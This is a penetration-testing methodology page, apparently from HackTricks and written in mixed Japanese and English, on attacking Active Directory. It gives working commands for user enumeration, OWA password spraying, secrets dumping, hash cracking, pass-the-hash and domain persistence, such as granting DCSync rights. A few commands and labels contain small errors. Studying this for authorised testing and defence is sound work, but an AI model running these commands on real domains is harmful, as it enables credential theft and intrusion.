# Active Directory 方法論

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤技術として機能し、**ネットワーク管理者** がネットワーク内で **domains**, **users**, **objects** を効率的に作成・管理できるようにします。大規模にスケールするよう設計されており、多数のユーザを扱いやすい **groups** や **subgroups** に整理し、様々なレベルで **access rights** を制御できます。

**Active Directory** の構造は主に 3 つの層で構成されます：**domains**, **trees**, **forests**。**domain** は共通のデータベースを共有する **users** や **devices** といったオブジェクトの集合を含みます。**trees** はこれらの domains が共通の構造で結合されたグループで、**forest** は複数の trees の集合であり、**trust relationships** によって相互接続された組織構造の最上位を表します。これら各レベルで特定の **access** や **communication rights** を指定できます。

**Active Directory** の主要な概念は以下の通りです：

1. **Directory** – Active Directory オブジェクトに関する全ての情報を格納します。
2. **Object** – ディレクトリ内のエンティティを指し、**users**, **groups**, **shared folders** などが含まれます。
3. **Domain** – ディレクトリオブジェクトのコンテナとして機能し、複数の domains が **forest** 内に共存でき、それぞれ独自のオブジェクトコレクションを維持します。
4. **Tree** – 共通のルートドメインを共有する domains のグループです。
5. **Forest** – Active Directory の組織構造の頂点で、複数の trees とそれらの間の **trust relationships** で構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理と通信に必要な一連のサービスを包含します。これらのサービスは以下を含みます：

1. **Domain Services** – データの集中保存と **users** と **domains** のやり取りを管理し、**authentication** や **search** 機能を提供します。
2. **Certificate Services** – セキュアな **digital certificates** の作成、配布、管理を監督します。
3. **Lightweight Directory Services** – **LDAP protocol** を通して directory 対応アプリケーションをサポートします。
4. **Directory Federation Services** – 複数の Web アプリケーションに対して **single-sign-on** を提供します。
5. **Rights Management** – 著作物の不正配布や使用を規制することで保護を支援します。
6. **DNS Service** – **domain names** の解決に不可欠です。

詳細は次を参照してください: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD を攻撃する方法を学ぶためには、**Kerberos authentication process** を非常によく理解する必要があります。\
[**このページをまだ理解していないなら読んでください。**](kerberos-authentication.md)

## Cheat Sheet

クイックにどのコマンドで AD の列挙/悪用ができるかを確認するには、次を参照してください: [https://wadcoms.github.io/](https://wadcoms.github.io)

> [!WARNING]
> Kerberos communication はアクションを実行するために **full qualifid name (FQDN)** を必要とします。マシンに IP アドレスでアクセスしようとすると、**それは Kerberos ではなく NTLM を使用します**。

## Recon Active Directory (No creds/sessions)

もし AD 環境にアクセスはあるが認証情報/セッションを持っていない場合、以下のことができます：

- **Pentest the network:**
  - ネットワークをスキャンしてマシンや開いているポートを見つけ、**脆弱性を悪用する**か **認証情報を抽出する**（例： [printers could be very interesting targets](ad-information-in-printers.md)）。
  - DNS の列挙は web、printers、shares、vpn、media などドメイン内の主要サーバに関する情報を与えることがあります。
  - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 詳細は一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を参照してください。
- **Check for null and Guest access on smb services** (これは最新の Windows バージョンでは動作しません):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB サーバを列挙する方法の詳細ガイドは次を参照してください：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP の列挙方法の詳細ガイドは次を参照してください（**anonymous access** に特に注意）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
  - Responder を使って **impersonating services** により認証情報を収集する（[**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)）
  - [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) によりホストへアクセスする
  - evil-S を使って **fake UPnP services** を公開して認証情報を収集する（[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)）
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - 内部ドキュメント、ソーシャルメディア、ドメイン内のサービス（主に Web）や公開されている情報からユーザ名/氏名を抽出します。
  - 会社従業員のフルネームが分かれば、AD の **username conventions** を試してみることができます（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。一般的な慣例は次の通りです： _NameSurname_, _Name.Surname_, _NamSur_ (各から 3 文字), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 つの _random letters and 3 random numbers_ (abc123)。
  - ツール:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) と [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: 無効な username がリクエストされると、サーバは **Kerberos error** コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ で応答し、その username が無効であることを判定できます。**Valid usernames** は AS-REP における **TGT** の返答か、事前認証を要求するエラー _KRB5KDC_ERR_PREAUTH_REQUIRED_ を引き起こします。
- **No Authentication against MS-NRPC**: ドメインコントローラ上の MS-NRPC (Netlogon) インターフェースに対して auth-level = 1 (No authentication) を使用します。このメソッドは MS-NRPC インターフェースにバインドした後に `DsrGetDcNameEx2` 関数を呼び出し、資格情報なしでユーザやコンピュータの存在を確認します。NauthNRPC ツールはこの種の列挙を実装しています。研究はここにあります: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク内でこれらのサーバーのいずれかを見つけた場合、これに対して**user enumeration**を実行することもできます。例えば、ツール [**MailSniper**](https://github.com/dafthack/MailSniper) を使用できます：
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **会社で働く人の名前** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### ユーザー名が1つ以上分かっている場合

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): ユーザーが属性 _DONT_REQ_PREAUTH_ を持っていない場合、**request a AS_REP message** を行うことで、そのユーザーのパスワードから派生した鍵で暗号化されたデータを含む応答を得ることができます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに対して最も**common passwords**を試してみてください。悪いパスワードを使用しているユーザーがいるかもしれません（**password policy** に注意！）。
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

ネットワークのいくつかのプロトコルを**poisoning**して、クラック可能なチャレンジ**hashes**を**obtain**できる可能性があります:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **より多くのメールやネットワークの理解**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- SMB relay to the DC が signing によりブロックされている場合でも、**LDAP** の posture は引き続き確認する: `netexec ldap <dc>` は `(signing:None)` / weak channel binding を示す。SMB signing を要求し LDAP signing が無効な DC は、**SPN-less RBCD** のような悪用に対して **relay-to-LDAP** の有効なターゲットのままである。

### クライアント側プリンターの credential leaks → 大量ドメイン資格情報の検証

- Printer/web UIs は時々 **HTML 内にマスクされた admin passwords を埋め込んでいる**。ソース／devtools を表示すると cleartext が露出することがあり（例: `<input value="<password>">`）、Basic-auth により scan/print リポジトリへアクセスできるようになる。
- 取得した印刷ジョブにはユーザーごとのパスワードを含む **plaintext onboarding docs** が含まれていることがある。テスト時はペアリングを崩さないように保つ:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM Credsを盗む

nullやguestユーザーで他のPCや共有にアクセスできる場合、SCFファイルのようなファイルを配置して、それが何らかの方法でアクセスされるとあなたに対してNTLM認証が発生し、そのNTLMチャレンジを盗んでクラッキングできる可能性があります。

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**は、既に持っているすべてのNTハッシュを、NTハッシュから直接導出されるキー素材を使う他の遅いフォーマット向けの候補パスワードとして扱います。Kerberos RC4チケット、NetNTLMチャレンジ、またはキャッシュされた資格情報のような長いパスフレーズを総当たりする代わりに、NTハッシュをHashcatのNT-candidateモードに投入して、平文を知ることなくパスワード再利用を検証させます。ドメイン侵害後に何千もの現在および過去のNTハッシュを収集できるときに非常に強力です。

shuckingを使うべき場合:

- DCSync、SAM/SECURITYダンプ、または資格情報ボールトからNTコーパスを持っており、他のドメイン/フォレストでの再利用をテストする必要があるとき。
- RC4ベースのKerberos素材（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLMレスポンス、またはDCC/DCC2ブロブをキャプチャしたとき。
- 長く解読困難なパスフレーズの再利用を素早く立証し、即座にPass-the-Hashでピボットしたいとき。

この手法は、キーがNTハッシュではない暗号化タイプ（例: Kerberos etype 17/18 AES）には効果がありません。ドメインがAESのみを強制している場合は、通常のpasswordモードに戻る必要があります。

#### NTハッシュコーパスの構築

- **DCSync/NTDS** – historyオプション付きで`secretsdump.py`を使い、可能な限り多くのNTハッシュ（および過去の値）を取得します:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Historyエントリは候補プールを劇的に広げます。Microsoftはアカウントごとに最大24個の過去ハッシュを保存できます。NTDSのシークレットを収集するその他の方法については次を参照してください:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（または Mimikatz の `lsadump::sam /patch`）はローカルSAM/SECURITYデータとキャッシュされたドメインログオン（DCC/DCC2）を抽出します。重複を除去して同じ `nt_candidates.txt` リストに追加してください。
- **メタデータの追跡** – ハッシュを生成したユーザー名/ドメインを保持してください（ワードリストが16進のみでも）。Hashcatが成功した候補を表示したら、一致したハッシュがどのプリンシパルの再利用かすぐに分かります。
- ショックングの際は同じフォレストまたは信頼されたフォレストからの候補を優先してください。重複の可能性が最大化されます。

#### Hashcat NT-candidate モード

| ハッシュタイプ                            | Password モード | NT-Candidate モード |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意:

- NT-candidate入力は**必ず生の32-hex NTハッシュのまま**にしてください。ルールエンジンを無効にしてください（`-r`なし、ハイブリッドモードなし）。マングリングは候補キー素材を破壊します。
- これらのモード自体が本質的に速いわけではありませんが、NTLMのキー空間（M3 Maxで約30,000 MH/s）はKerberos RC4（約300 MH/s）より約100×速いです。キュレーションされたNTリストをテストする方が、遅いフォーマットで全パスワード空間を探索するよりはるかに安価です。
- 常に最新のHashcatビルドを実行してください (`git clone https://github.com/hashcat/hashcat && make install`)。モード31500/31600/35300/35400は最近追加されました。
- 現在AS-REQ Pre-Auth向けのNTモードはなく、AES etypes（19600/19700）はキーがPBKDF2でUTF-16LEパスワードから派生するため平文パスワードが必要です。生のNTハッシュでは動作しません。

#### 例 – Kerberoast RC4 (mode 35300)

1. 低権限ユーザーでターゲットSPNのRC4 TGSをキャプチャします（詳細はKerberoastページを参照）:

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NTリストでチケットをshuckします:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcatは各NT候補からRC4キーを導出し、`$krb5tgs$23$...` ブロブを検証します。マッチすれば、そのサービスアカウントがあなたの既存のNTハッシュのいずれかを使用していることが確認できます。

3. 直ちにPtHでピボットします:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

必要に応じて後で `hashcat -m 1000 <matched_hash> wordlists/` で平文を回復することもできます。

#### 例 – キャッシュされた資格情報 (mode 31600)

1. 侵害したワークステーションからキャッシュログオンをダンプします:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 興味あるドメインユーザーのDCC2行を `dcc2_highpriv.txt` にコピーし、shuckします:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功したマッチは、あなたのリストに既にあるNTハッシュを示し、キャッシュユーザーがパスワードを再利用していることを証明します。PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）に直接使うか、高速なNTLMモードで総当たりして文字列を回復できます。

同じワークフローはNetNTLMチャレンジレスポンス（`-m 27000/27100`）やDCC（`-m 31500`）にも適用されます。一致が確認されれば、relay、SMB/WMI/WinRM PtHを開始したり、オフラインでマスク/ルールを使ってNTハッシュを再クラッキングできます。

## 資格情報/セッションありでのActive Directory列挙

このフェーズでは、有効なドメインアカウントの資格情報またはセッションを侵害している必要があります。もし有効な資格情報やドメインユーザーとしてのシェルを持っているなら、前述のオプション（他ユーザーを侵害する手段）がまだ使えることを忘れないでください。

認証済み列挙を開始する前に、Kerberos double hop problemを理解しておくべきです。

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 列挙

アカウントを侵害することは、ドメイン全体を侵害し始めるための大きな一歩です。これにより、Active Directory列挙を開始できます。

[**ASREPRoast**](asreproast.md)に関しては、今や脆弱なユーザーをすべて見つけることができ、[**Password Spraying**](password-spraying.md)に関しては、すべてのユーザー名のリストを取得して、侵害したアカウントのパスワード、空パスワード、または有望な新パスワードを試すことができます。

- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) を使って基本的な情報収集を行えます。
- よりステルスに行うなら [**powershell for recon**](../basic-powershell-for-pentesters/index.html) を使うこともできます。
- より詳細な情報を抽出するには [**use powerview**](../basic-powershell-for-pentesters/powerview.md) も有効です。
- Active Directoryの調査に強力なツールの一つが [**BloodHound**](bloodhound.md) です。収集方法によっては**あまりステルスではありません**が、気にしないなら試す価値は大いにあります。ユーザーがRDPできる場所や他のグループへの経路などを見つけられます。
- **その他の自動AD列挙ツール:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- ADの[**DNSレコード**](ad-dns-records.md)は興味深い情報を含んでいる可能性があります。
- GUIでディレクトリを列挙できるツールとしては、**SysInternal** Suiteの **AdExplorer.exe** があります。
- LDAPデータベースを **ldapsearch** で検索して、_userPassword_ や _unixUserPassword_、あるいは _Description_ フィールドに資格情報が含まれていないか探すこともできます。その他の方法は PayloadsAllTheThings の [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- **Linux** を使っている場合は [**pywerview**](https://github.com/the-useless-one/pywerview) でドメインを列挙することもできます。
- 自動化ツールを試すこともできます:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **全ドメインユーザーの抽出**

Windowsではドメインのユーザー名を取得するのは非常に簡単です（`net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid`）。Linuxでは `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` や `enum4linux -a -u "user" -p "password" <DC IP>` を使用できます。

> この列挙セクションは短く見えるかもしれませんが、これは最も重要な部分です。リンク（主に cmd、powershell、powerview、BloodHound）にアクセスして、ドメインをどのように列挙するかを学び、慣れるまで繰り返し練習してください。アセスメント中、ここがDAに到達する鍵となる瞬間か、何もできないと判断する瞬間になります。

### Kerberoast

Kerberoastingは、ユーザーアカウントに紐づくサービスが使用する**TGSチケット**を取得し、それらの暗号（ユーザーパスワードに基づく）を**オフラインで**クラッキングする手法です。

詳細は次を参照してください:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

資格情報を取得したら、どの**マシン**にアクセスできるかを確認できます。そのために、ポートスキャン結果に応じて複数のサーバーに対して異なるプロトコルで接続を試みるために **CrackMapExec** を使うことができます。

### ローカル権限昇格

通常のドメインユーザーとして資格情報やセッションを侵害し、そのユーザーでドメイン内の任意のマシンに**アクセス**できる場合、ローカルで権限を昇格させ資格情報を収集する方法を探すべきです。ローカル管理者権限があれば、他のユーザーのハッシュをメモリ内（LSASS）やローカル（SAM）からダンプできます。

本書には [**Windowsでのローカル権限昇格**](../windows-local-privilege-escalation/index.html) に関する完全なページと、チェックリスト（../checklist-windows-privilege-escalation.md）があります。 また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の使用も忘れないでください。

### 現在のセッションのチケット

現在のユーザーに、予期しないリソースへアクセスする権限を与える**チケット**が見つかる可能性は非常に低いですが、次の点を確認することはできます:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

基本的な資格情報を入手したら、AD 内で共有されている**興味深いファイルを見つけられるか**確認するべきです。手動でも可能ですが、非常に退屈で反復的な作業です（調べるドキュメントが何百とあればなおさら）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrato**r you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなり**ノイズが多く**、**LAPS**がそれを**緩和**することに注意してください。

### MSSQL の悪用と信頼されたリンク

ユーザーが**MSSQL インスタンスにアクセスする権限**を持っている場合、MSSQL ホスト上で（SA として動作している場合）**コマンドを実行**したり、NetNTLM **hash** を**盗む**、さらには **relay attack** を実行することも可能です。\
また、ある MSSQL インスタンスが別の MSSQL インスタンスから信頼（database link）されている場合、ユーザーがその信頼されたデータベースに対する権限を持っていれば、**信頼関係を利用して他のインスタンスでもクエリを実行する**ことができます。これらのトラストはチェーン化でき、最終的にコマンドを実行できるような設定ミスのあるデータベースを見つけることがあるでしょう。\
**データベース間のリンクはフォレスト間のトラストをまたいでも機能します。**

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 資産／デプロイメント プラットフォームの悪用

サードパーティのインベントリおよびデプロイメントスイートは、しばしば資格情報やコード実行への強力な経路を公開します。参照：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) を持つ Computer オブジェクトを見つけ、かつそのコンピュータ上でドメイン権限を持っている場合、コンピュータにログインするすべてのユーザーのメモリから TGT をダンプできます。\
したがって、もし**Domain Admin がそのコンピュータにログイン**すると、彼の TGT をダンプして [Pass the Ticket](pass-the-ticket.md) を使って偽装できます。\
Constrained Delegation により、**Print Server を自動的に乗っ取る**ことさえ可能です（できればそれが DC であればなお良い）。

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

ユーザーやコンピュータが "Constrained Delegation" を許可されている場合、そのコンピュータのサービスに対して**任意のユーザーを偽装してアクセス**することが可能になります。\
また、このユーザー/コンピュータの **hash** を奪取すれば、（Domain Admin を含む）**任意のユーザーを偽装**してサービスにアクセスできるようになります。

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

リモートコンピュータの Active Directory オブジェクトに対して **WRITE** 権限を持っていると、高権限でのコード実行を得ることが可能になります：

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs の悪用

侵害されたユーザーは、いくつかのドメインオブジェクトに対して**興味深い特権**を持っている場合があり、それによって後で**横移動／権限昇格**が可能になることがあります。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler サービスの悪用

ドメイン内で **Spool service が待ち受け**ていることを発見すると、これを**悪用**して**新しい資格情報を取得**したり**権限を昇格**させたりすることができます。

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### サードパーティセッションの悪用

他のユーザーが侵害されたマシンに**アクセス**すると、メモリから**資格情報を収集**したり、プロセスに**beacon を注入**してそれらのユーザーを偽装したりすることが可能です。\
通常、ユーザーは RDP を通じてシステムにアクセスするため、ここではサードパーティの RDP セッションに対して行ういくつかの攻撃方法を示します:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** は、ドメイン参加コンピュータ上の **ローカル Administrator パスワード** を管理するためのシステムを提供し、そのパスワードが**ランダム化**され、一意で、頻繁に**変更**されることを保証します。これらのパスワードは Active Directory に保存され、ACL によって許可されたユーザーのみがアクセスできます。これらのパスワードにアクセスする十分な権限があれば、他のコンピュータへピボットすることが可能になります。

{{#ref}}
laps.md
{{#endref}}

### 証明書の窃取

侵害されたマシンから**証明書を収集**することは、環境内での権限昇格の手段になり得ます：

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 証明書テンプレートの悪用

脆弱なテンプレートが設定されている場合、それらを悪用して権限を昇格させることが可能です：

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 高権限アカウントでのポストエクスプロイテーション

### ドメイン資格情報のダンプ

一旦 **Domain Admin**、あるいはさらに **Enterprise Admin** の権限を獲得すると、ドメインデータベース _ntds.dit_ を**ダンプ**できます。

[**DCSync attack に関する詳細はこちら**](dcsync.md).

[**NTDS.dit を盗む方法に関する詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### 権限昇格を利用した永続化

前述のいくつかの手法は永続化に利用できます。\
例えば、以下のようなことが可能です:

- ユーザーを [**Kerberoast**](kerberoast.md) に対して脆弱にする

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- ユーザーを [**ASREPRoast**](asreproast.md) に対して脆弱にする

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- ユーザーに [**DCSync**](#dcsync) 権限を付与する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** は、特定のサービス向けに**正当な Ticket Granting Service (TGS) チケット**を、**NTLM hash**（例えば **PC アカウントの hash**）を用いて作成します。この手法は**サービス権限へアクセス**するために用いられます。

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** は、攻撃者が Active Directory (AD) 環境で **krbtgt アカウントの NTLM hash** を入手することを含みます。krbtgt アカウントはすべての **Ticket Granting Tickets (TGTs)** に署名するために使われるため特別です。

攻撃者がこのハッシュを入手すると、任意のアカウント用の **TGTs** を作成できるようになります（Silver ticket attack）。

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diamond Ticket は Golden Ticket に似ていますが、**一般的な golden ticket 検出機構を回避する**ように偽造されています。

{{#ref}}
diamond-ticket.md
{{#endref}}

### **証明書によるアカウント永続化**

**アカウントの証明書を所有する、または要求できること**は、（パスワードを変更されても）ユーザーのアカウントに永続化する非常に有効な方法です：

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **証明書によるドメイン永続化**

**証明書を使用することで、ドメイン内で高権限の永続化を実現することも可能です：**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder グループ

